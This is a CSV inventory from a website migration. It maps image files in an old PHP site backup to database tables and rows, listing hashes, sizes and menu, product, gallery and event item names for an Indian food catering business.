37.jpg,old-website-php/Full-website-backup/frontEnd/items/37.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_img
37.jpg,old-website-php/Full-website-backup/frontEnd/items/37.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),menu_item_tbl,37,Corn Soup,menu_small_img
37.jpg,old-website-php/Full-website-backup/frontEnd/items/37.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),product_item_tbl,37,Mint Yogurt Chutney,menu_img
38.jpg,old-website-php/Full-website-backup/frontEnd/items/38.jpg,8048,1c35bdcb92f0fecc292d930b4ae5c362e21a0cb4e10071e072ed070fde35508a,282028e5cbeb2d44af43a36fbbb0fc7e,DB Mapped (Verified),product_item_tbl,38,Methi Chutney,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/items/39.jpg,8879,947ddc1c9bb674e8847aa62f27b6630ae836c81c9ae6677c7a6b3064ba1b041e,8fc385a6524a84aef38341cf6e804404,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_img
39.jpg,old-website-php/Full-website-backup/frontEnd/items/39.jpg,8879,947ddc1c9bb674e8847aa62f27b6630ae836c81c9ae6677c7a6b3064ba1b041e,8fc385a6524a84aef38341cf6e804404,DB Mapped (Verified),menu_item_tbl,39,Tom Yum Soup,menu_small_img
39.jpg,old-website-php/Full-website-backup/frontEnd/items/39.jpg,8879,947ddc1c9bb674e8847aa62f27b6630ae836c81c9ae6677c7a6b3064ba1b041e,8fc385a6524a84aef38341cf6e804404,DB Mapped (Verified),product_item_tbl,39,Capsicum Peanut Chutney,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),website_gallery,4,Images 4,gimage
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),recipe_appliances_kits,4,Spatula,kits_img
4.jpg,old-website-php/Full-website-backup/frontEnd/items/4.jpg,9822,a9ab4228417c26dfd4e1f0fe24f86780cfa851011ac3baaf4c00b2261305d493,a9d171f0102e9e0bbe2fa0c26d0230b7,DB Mapped (Verified),event_cuisine,4,Flame Grilled to Perfection,cuisine_img
40.jpg,old-website-php/Full-website-backup/frontEnd/items/40.jpg,9226,b05117350dc216334c5f489bd6503fe60d58ff93d1e56a7c072ea50691519baa,5e14ea1f1951e572ecf4f410e3f3e609,DB Mapped (Verified),product_item_tbl,40,Red Bell Pepper Chutney,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/items/41.jpg,11178,73ac0e59d9bd55a9a1b452a32004b70877fc240033eb9b4c3a469a41618e59ca,03bf1ad55e7f91489b446c38e3d6fbb4,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_img
41.jpg,old-website-php/Full-website-backup/frontEnd/items/41.jpg,11178,73ac0e59d9bd55a9a1b452a32004b70877fc240033eb9b4c3a469a41618e59ca,03bf1ad55e7f91489b446c38e3d6fbb4,DB Mapped (Verified),menu_item_tbl,41,Maxican Soup,menu_small_img
41.jpg,old-website-php/Full-website-backup/frontEnd/items/41.jpg,11178,73ac0e59d9bd55a9a1b452a32004b70877fc240033eb9b4c3a469a41618e59ca,03bf1ad55e7f91489b446c38e3d6fbb4,DB Mapped (Verified),product_item_tbl,41,Zucchini Chutney,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/items/42.jpg,8973,9194e13936a179e8d7413308faf098aeab08ed8a987fcd4804d8cf5b0d498b4c,27060a6abd91c7ecb9a3c3fdd1b8c678,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_img
42.jpg,old-website-php/Full-website-backup/frontEnd/items/42.jpg,8973,9194e13936a179e8d7413308faf098aeab08ed8a987fcd4804d8cf5b0d498b4c,27060a6abd91c7ecb9a3c3fdd1b8c678,DB Mapped (Verified),menu_item_tbl,42,Tomato Coconut Soup,menu_small_img
42.jpg,old-website-php/Full-website-backup/frontEnd/items/42.jpg,8973,9194e13936a179e8d7413308faf098aeab08ed8a987fcd4804d8cf5b0d498b4c,27060a6abd91c7ecb9a3c3fdd1b8c678,DB Mapped (Verified),product_item_tbl,42,Walnut Chutney,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/items/43.jpg,7847,6494904c59c9a3136d16379d4e4f03bf2d4ce6e4616f10285ca68d0f9e7f9386,d73a847e57895c9c96b8691e1601ffb0,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_img
43.jpg,old-website-php/Full-website-backup/frontEnd/items/43.jpg,7847,6494904c59c9a3136d16379d4e4f03bf2d4ce6e4616f10285ca68d0f9e7f9386,d73a847e57895c9c96b8691e1601ffb0,DB Mapped (Verified),menu_item_tbl,43,Palak Paneer Soup,menu_small_img
43.jpg,old-website-php/Full-website-backup/frontEnd/items/43.jpg,7847,6494904c59c9a3136d16379d4e4f03bf2d4ce6e4616f10285ca68d0f9e7f9386,d73a847e57895c9c96b8691e1601ffb0,DB Mapped (Verified),product_item_tbl,43,Mango Chutney,menu_img
44.jpg,old-website-php/Full-website-backup/frontEnd/items/44.jpg,12551,405d9fad928c04f3dd0d35afb34471a0969351100f083eb177fdaad7081cc45b,decc20f89eb30ee0440bd34ededdd22b,Static / Orphaned Disk Asset,,,,
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),product_item_tbl,5,Loose Namek Pare,menu_img
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),website_gallery,5,Images 5,gimage
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),recipe_appliances_kits,5,Toothpicks,kits_img
5.jpg,old-website-php/Full-website-backup/frontEnd/items/5.jpg,5722,06f8ecf1800489476c21156f814a948ba7153d5962a69b4a990a89ef494af262,7567bfd108368fddf094a1b722e60940,DB Mapped (Verified),event_cuisine,5,First meal of the day,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),product_item_tbl,6,Masala Pare,menu_img
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),website_gallery,6,Images 6,gimage
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),worke_work_experience,6,as worked at,workproimg
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),recipe_appliances_kits,6,Lemon,kits_img
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),event_cuisine,6,Mithas Dil Se,cuisine_img
6.jpg,old-website-php/Full-website-backup/frontEnd/items/6.jpg,12023,f215aadf5219a8c6a9d17f0a2eb7fe0981958f74538321e5a36e6a7c25ec1cf8,578574e239067ef14a73bab88b1f7f93,DB Mapped (Verified),event_requirement,6,Good Friday,event_img
7.jpg,old-website-php/Full-website-backup/frontEnd/items/7.jpg,6169,6f5900bcafc365e7ae390352dc1c9ceaa64031638477df5a659f93199a95f0ec,b2a8c4dcbf63e65579a9ce9e1edc2df7,DB Mapped (Verified),menu_item_tbl,7,Curd Rice,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/items/7.jpg,6169,6f5900bcafc365e7ae390352dc1c9ceaa64031638477df5a659f93199a95f0ec,b2a8c4dcbf63e65579a9ce9e1edc2df7,DB Mapped (Verified),product_item_tbl,7,Pithi Kachori,menu_img
7.jpg,old-website-php/Full-website-backup/frontEnd/items/7.jpg,6169,6f5900bcafc365e7ae390352dc1c9ceaa64031638477df5a659f93199a95f0ec,b2a8c4dcbf63e65579a9ce9e1edc2df7,DB Mapped (Verified),worke_work_experience,7,knows these Cuisines3,workproimg
7.jpg,old-website-php/Full-website-backup/frontEnd/items/7.jpg,6169,6f5900bcafc365e7ae390352dc1c9ceaa64031638477df5a659f93199a95f0ec,b2a8c4dcbf63e65579a9ce9e1edc2df7,DB Mapped (Verified),recipe_appliances_kits,7,Coriander Leaves,kits_img
7.jpg,old-website-php/Full-website-backup/frontEnd/items/7.jpg,6169,6f5900bcafc365e7ae390352dc1c9ceaa64031638477df5a659f93199a95f0ec,b2a8c4dcbf63e65579a9ce9e1edc2df7,DB Mapped (Verified),event_cuisine,7,Soups & Beverages,cuisine_img
8.jpg,old-website-php/Full-website-backup/frontEnd/items/8.jpg,9545,c2016d7f82a69d6ce4ea2bee783bf7afc678259336b79e45b93f8794dd06308f,d3ac22bdbe02281cc21e53ddd79f1ed9,DB Mapped (Verified),product_item_tbl,8,Sakkar Pare,menu_img
8.jpg,old-website-php/Full-website-backup/frontEnd/items/8.jpg,9545,c2016d7f82a69d6ce4ea2bee783bf7afc678259336b79e45b93f8794dd06308f,d3ac22bdbe02281cc21e53ddd79f1ed9,DB Mapped (Verified),worke_work_experience,8,knows these Cuisines,workproimg
8.jpg,old-website-php/Full-website-backup/frontEnd/items/8.jpg,9545,c2016d7f82a69d6ce4ea2bee783bf7afc678259336b79e45b93f8794dd06308f,d3ac22bdbe02281cc21e53ddd79f1ed9,DB Mapped (Verified),recipe_appliances_kits,8,Salt,kits_img
8.jpg,old-website-php/Full-website-backup/frontEnd/items/8.jpg,9545,c2016d7f82a69d6ce4ea2bee783bf7afc678259336b79e45b93f8794dd06308f,d3ac22bdbe02281cc21e53ddd79f1ed9,DB Mapped (Verified),event_cuisine,8,Starters,cuisine_img
9.jpg,old-website-php/Full-website-backup/frontEnd/items/9.jpg,9048,d35e488c4c719870db6a1736467e47c736517d27276f3cabeb1de22ef34d74d4,2fb903709e55ca51125683407488f952,DB Mapped (Verified),menu_item_tbl,9,Tamarind Rice,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/items/9.jpg,9048,d35e488c4c719870db6a1736467e47c736517d27276f3cabeb1de22ef34d74d4,2fb903709e55ca51125683407488f952,DB Mapped (Verified),product_item_tbl,9,Atta Dry Fruit Laddoo,menu_img
9.jpg,old-website-php/Full-website-backup/frontEnd/items/9.jpg,9048,d35e488c4c719870db6a1736467e47c736517d27276f3cabeb1de22ef34d74d4,2fb903709e55ca51125683407488f952,DB Mapped (Verified),worke_work_experience,9,knows these Cuisines2,workproimg
9.jpg,old-website-php/Full-website-backup/frontEnd/items/9.jpg,9048,d35e488c4c719870db6a1736467e47c736517d27276f3cabeb1de22ef34d74d4,2fb903709e55ca51125683407488f952,DB Mapped (Verified),recipe_appliances_kits,9,Green Capsicum,kits_img
1.jpeg,old-website-php/Full-website-backup/frontEnd/location/1.jpeg,2319,5881da75a9d458855702ede4d8fa7fb5d70c40a46a49da7ee743fce91ff52196,ed507a2d83b1634162b8ada8a080f614,DB Mapped (Verified),prof_job_worker,1,Pankaj,userimg
1.jpg,old-website-php/Full-website-backup/frontEnd/location/1.jpg,83425,f02eea19a76a5232196d968bc2b6fdc678fa1b3f3630864d334adc9da0bc4003,2283c912357085b1330e8cac90182b5b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/location/1.jpg,83425,f02eea19a76a5232196d968bc2b6fdc678fa1b3f3630864d334adc9da0bc4003,2283c912357085b1330e8cac90182b5b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/location/1.jpg,83425,f02eea19a76a5232196d968bc2b6fdc678fa1b3f3630864d334adc9da0bc4003,2283c912357085b1330e8cac90182b5b,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/location/1.jpg,83425,f02eea19a76a5232196d968bc2b6fdc678fa1b3f3630864d334adc9da0bc4003,2283c912357085b1330e8cac90182b5b,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/location/1.jpg,83425,f02eea19a76a5232196d968bc2b6fdc678fa1b3f3630864d334adc9da0bc4003,2283c912357085b1330e8cac90182b5b,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/location/1.jpg,83425,f02eea19a76a5232196d968bc2b6fdc678fa1b3f3630864d334adc9da0bc4003,2283c912357085b1330e8cac90182b5b,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpg,old-website-php/Full-website-backup/frontEnd/location/10.jpg,10478,b707bb04ce9ba0d47513af29106c2373942a440aeacbd00f40e5c8cb925b5a8e,580cf9747205a0ceda855016926e1a4c,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/location/10.jpg,10478,b707bb04ce9ba0d47513af29106c2373942a440aeacbd00f40e5c8cb925b5a8e,580cf9747205a0ceda855016926e1a4c,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/location/10.jpg,10478,b707bb04ce9ba0d47513af29106c2373942a440aeacbd00f40e5c8cb925b5a8e,580cf9747205a0ceda855016926e1a4c,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/location/10.jpg,10478,b707bb04ce9ba0d47513af29106c2373942a440aeacbd00f40e5c8cb925b5a8e,580cf9747205a0ceda855016926e1a4c,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/location/11.jpg,9969,8f4803fb683663ec1b5b8a05480cd4f340d02d6133fd2e1e31775a63343e486c,139b7ad38e46f4190b53f81ed3cdead2,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/location/11.jpg,9969,8f4803fb683663ec1b5b8a05480cd4f340d02d6133fd2e1e31775a63343e486c,139b7ad38e46f4190b53f81ed3cdead2,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/location/11.jpg,9969,8f4803fb683663ec1b5b8a05480cd4f340d02d6133fd2e1e31775a63343e486c,139b7ad38e46f4190b53f81ed3cdead2,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/location/11.jpg,9969,8f4803fb683663ec1b5b8a05480cd4f340d02d6133fd2e1e31775a63343e486c,139b7ad38e46f4190b53f81ed3cdead2,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/location/11.jpg,9969,8f4803fb683663ec1b5b8a05480cd4f340d02d6133fd2e1e31775a63343e486c,139b7ad38e46f4190b53f81ed3cdead2,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/location/12.jpg,8897,4da615e9c8f5dcf4e1a8f3c11940ac79d5fac6a165b01ec4f1922e474a442478,cb51d39ac9a463b34b27e5af0f0c21d0,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/location/12.jpg,8897,4da615e9c8f5dcf4e1a8f3c11940ac79d5fac6a165b01ec4f1922e474a442478,cb51d39ac9a463b34b27e5af0f0c21d0,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/location/12.jpg,8897,4da615e9c8f5dcf4e1a8f3c11940ac79d5fac6a165b01ec4f1922e474a442478,cb51d39ac9a463b34b27e5af0f0c21d0,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/location/12.jpg,8897,4da615e9c8f5dcf4e1a8f3c11940ac79d5fac6a165b01ec4f1922e474a442478,cb51d39ac9a463b34b27e5af0f0c21d0,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/location/13.jpg,13422,6321c40bdd31bf2a803d0e03bcb1190cd6b9b75717e171e2296c28ae9df5e73e,7e6435af94f4ab43505e1f40265a8956,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/location/13.jpg,13422,6321c40bdd31bf2a803d0e03bcb1190cd6b9b75717e171e2296c28ae9df5e73e,7e6435af94f4ab43505e1f40265a8956,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/location/13.jpg,13422,6321c40bdd31bf2a803d0e03bcb1190cd6b9b75717e171e2296c28ae9df5e73e,7e6435af94f4ab43505e1f40265a8956,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/location/13.jpg,13422,6321c40bdd31bf2a803d0e03bcb1190cd6b9b75717e171e2296c28ae9df5e73e,7e6435af94f4ab43505e1f40265a8956,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/location/13.jpg,13422,6321c40bdd31bf2a803d0e03bcb1190cd6b9b75717e171e2296c28ae9df5e73e,7e6435af94f4ab43505e1f40265a8956,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
14.jpg,old-website-php/Full-website-backup/frontEnd/location/14.jpg,197043,114132b16048bd7684475931ac1fe25c2704c036265ebda9a451d9d78f220a01,b03a03a6effa166cef056a8c6f8308df,DB Mapped (Verified),product_item_tbl,14,Chhena Murgi,menu_img
14.jpg,old-website-php/Full-website-backup/frontEnd/location/14.jpg,197043,114132b16048bd7684475931ac1fe25c2704c036265ebda9a451d9d78f220a01,b03a03a6effa166cef056a8c6f8308df,DB Mapped (Verified),website_gallery,14,Event at Delhi,gimage
14.jpg,old-website-php/Full-website-backup/frontEnd/location/14.jpg,197043,114132b16048bd7684475931ac1fe25c2704c036265ebda9a451d9d78f220a01,b03a03a6effa166cef056a8c6f8308df,DB Mapped (Verified),worke_work_experience,14,tarters Dishes by12,workproimg
15.jpg,old-website-php/Full-website-backup/frontEnd/location/15.jpg,10023,f54e97c98b398bd6e24fea59b240cc5c001758ed458f326714fdf37d0814a862,e241e7d58783567262469ef456f10181,DB Mapped (Verified),product_item_tbl,15,Desi Ghee Bundi,menu_img
15.jpg,old-website-php/Full-website-backup/frontEnd/location/15.jpg,10023,f54e97c98b398bd6e24fea59b240cc5c001758ed458f326714fdf37d0814a862,e241e7d58783567262469ef456f10181,DB Mapped (Verified),website_gallery,15,Event at DPS school Gurugram,gimage
15.jpg,old-website-php/Full-website-backup/frontEnd/location/15.jpg,10023,f54e97c98b398bd6e24fea59b240cc5c001758ed458f326714fdf37d0814a862,e241e7d58783567262469ef456f10181,DB Mapped (Verified),worke_work_experience,15,Desserts Dishes by1,workproimg
16.jpg,old-website-php/Full-website-backup/frontEnd/location/16.jpg,13078,0b5ac6ed2c9f16458ba6a63029947af16247498cc9d99cbe3c706c944a844a48,fb6a1a85d055b6ef2826f97c0404733f,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/location/16.jpg,13078,0b5ac6ed2c9f16458ba6a63029947af16247498cc9d99cbe3c706c944a844a48,fb6a1a85d055b6ef2826f97c0404733f,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/location/16.jpg,13078,0b5ac6ed2c9f16458ba6a63029947af16247498cc9d99cbe3c706c944a844a48,fb6a1a85d055b6ef2826f97c0404733f,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
17.jpg,old-website-php/Full-website-backup/frontEnd/location/17.jpg,10301,d96a49550f00ceeccbd67fdcf5dbfd40821df9612d086cd325a06d3090955fdb,42a60a1df1c1b312ae1d3c8b00cdee21,DB Mapped (Verified),product_item_tbl,17,Desi Ghee Gujia,menu_img
17.jpg,old-website-php/Full-website-backup/frontEnd/location/17.jpg,10301,d96a49550f00ceeccbd67fdcf5dbfd40821df9612d086cd325a06d3090955fdb,42a60a1df1c1b312ae1d3c8b00cdee21,DB Mapped (Verified),website_gallery,17,Event at DPS school Gurugram,gimage
17.jpg,old-website-php/Full-website-backup/frontEnd/location/17.jpg,10301,d96a49550f00ceeccbd67fdcf5dbfd40821df9612d086cd325a06d3090955fdb,42a60a1df1c1b312ae1d3c8b00cdee21,DB Mapped (Verified),worke_work_experience,17,Desserts Dishes by2,workproimg
18.jpg,old-website-php/Full-website-backup/frontEnd/location/18.jpg,10696,17a9f5cacd9b906705db3e9aa08659943adcc987ad1581070fa31247cc058038,3d538019da9dfac7686d9ef3a5c71bdb,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/location/18.jpg,10696,17a9f5cacd9b906705db3e9aa08659943adcc987ad1581070fa31247cc058038,3d538019da9dfac7686d9ef3a5c71bdb,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/location/18.jpg,10696,17a9f5cacd9b906705db3e9aa08659943adcc987ad1581070fa31247cc058038,3d538019da9dfac7686d9ef3a5c71bdb,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/location/18.jpg,10696,17a9f5cacd9b906705db3e9aa08659943adcc987ad1581070fa31247cc058038,3d538019da9dfac7686d9ef3a5c71bdb,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
19.jpg,old-website-php/Full-website-backup/frontEnd/location/19.jpg,11731,513a8ece662d3f172eade174f53ec47fd7f5abff02eb2f35014907c347de6854,76115e37785821e7e7bab190e0fa4e60,DB Mapped (Verified),product_item_tbl,19,Dry Fruit Patisha,menu_img
19.jpg,old-website-php/Full-website-backup/frontEnd/location/19.jpg,11731,513a8ece662d3f172eade174f53ec47fd7f5abff02eb2f35014907c347de6854,76115e37785821e7e7bab190e0fa4e60,DB Mapped (Verified),website_gallery,19,Event at Delhi,gimage
19.jpg,old-website-php/Full-website-backup/frontEnd/location/19.jpg,11731,513a8ece662d3f172eade174f53ec47fd7f5abff02eb2f35014907c347de6854,76115e37785821e7e7bab190e0fa4e60,DB Mapped (Verified),worke_work_experience,19,reakfast Dishes by1,workproimg
2.jpg,old-website-php/Full-website-backup/frontEnd/location/2.jpg,11285,10c65af54c45c2ab53e888af5675494244dfe1556ca2d43c0db372a224d9f6b9,c879321aeb16100e93fdad80f9d26dd5,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/location/2.jpg,11285,10c65af54c45c2ab53e888af5675494244dfe1556ca2d43c0db372a224d9f6b9,c879321aeb16100e93fdad80f9d26dd5,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/location/2.jpg,11285,10c65af54c45c2ab53e888af5675494244dfe1556ca2d43c0db372a224d9f6b9,c879321aeb16100e93fdad80f9d26dd5,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/location/2.jpg,11285,10c65af54c45c2ab53e888af5675494244dfe1556ca2d43c0db372a224d9f6b9,c879321aeb16100e93fdad80f9d26dd5,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/location/2.jpg,11285,10c65af54c45c2ab53e888af5675494244dfe1556ca2d43c0db372a224d9f6b9,c879321aeb16100e93fdad80f9d26dd5,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/location/2.jpg,11285,10c65af54c45c2ab53e888af5675494244dfe1556ca2d43c0db372a224d9f6b9,c879321aeb16100e93fdad80f9d26dd5,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
20.jpg,old-website-php/Full-website-backup/frontEnd/location/20.jpg,9857,027f3c38719ddc92886aacd394dc775fe526a7a3969195e57dba8984e35750ec,62a367c44a0ba272c27bb066567a20fd,DB Mapped (Verified),product_item_tbl,20,Karachi Halwai,menu_img
20.jpg,old-website-php/Full-website-backup/frontEnd/location/20.jpg,9857,027f3c38719ddc92886aacd394dc775fe526a7a3969195e57dba8984e35750ec,62a367c44a0ba272c27bb066567a20fd,DB Mapped (Verified),website_gallery,20,Event at Ghaziabadh,gimage
20.jpg,old-website-php/Full-website-backup/frontEnd/location/20.jpg,9857,027f3c38719ddc92886aacd394dc775fe526a7a3969195e57dba8984e35750ec,62a367c44a0ba272c27bb066567a20fd,DB Mapped (Verified),worke_work_experience,20,Chinese Dishes by,workproimg
21.jpg,old-website-php/Full-website-backup/frontEnd/location/21.jpg,11499,b09ead0da5c88ae08cee533e21ee341780b084201f4e4daf379a21e4af4d7a99,d0ae359303f55e3d5ef148c5506ae187,DB Mapped (Verified),product_item_tbl,21,Meva Panjiri,menu_img
21.jpg,old-website-php/Full-website-backup/frontEnd/location/21.jpg,11499,b09ead0da5c88ae08cee533e21ee341780b084201f4e4daf379a21e4af4d7a99,d0ae359303f55e3d5ef148c5506ae187,DB Mapped (Verified),website_gallery,21,Event at Ghaziabadh,gimage
21.jpg,old-website-php/Full-website-backup/frontEnd/location/21.jpg,11499,b09ead0da5c88ae08cee533e21ee341780b084201f4e4daf379a21e4af4d7a99,d0ae359303f55e3d5ef148c5506ae187,DB Mapped (Verified),worke_work_experience,21,Chinese Dishes by 2,workproimg
3.jpg,old-website-php/Full-website-backup/frontEnd/location/3.jpg,14234,f44340f633e180769001aeab6038651f4be2bb878aaf86da0f6d05247e1eae89,296050c0a6e72e7bc789d13a046a8ca0,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/location/3.jpg,14234,f44340f633e180769001aeab6038651f4be2bb878aaf86da0f6d05247e1eae89,296050c0a6e72e7bc789d13a046a8ca0,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/location/3.jpg,14234,f44340f633e180769001aeab6038651f4be2bb878aaf86da0f6d05247e1eae89,296050c0a6e72e7bc789d13a046a8ca0,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/location/3.jpg,14234,f44340f633e180769001aeab6038651f4be2bb878aaf86da0f6d05247e1eae89,296050c0a6e72e7bc789d13a046a8ca0,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/location/3.jpg,14234,f44340f633e180769001aeab6038651f4be2bb878aaf86da0f6d05247e1eae89,296050c0a6e72e7bc789d13a046a8ca0,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
4.jpg,old-website-php/Full-website-backup/frontEnd/location/4.jpg,10290,f25ca8ccce002ae016edc22f8d935adea26233541fdd778bad8de9408b39c671,e17d3983e51cecf96acdd3cd1945bc76,DB Mapped (Verified),menu_item_tbl,4,Sambhar,menu_img
4.jpg,old-website-php/Full-website-backup/frontEnd/location/4.jpg,10290,f25ca8ccce002ae016edc22f8d935adea26233541fdd778bad8de9408b39c671,e17d3983e51cecf96acdd3cd1945bc76,DB Mapped (Verified),product_item_tbl,4,Loose Mitthi Matthi,menu_img
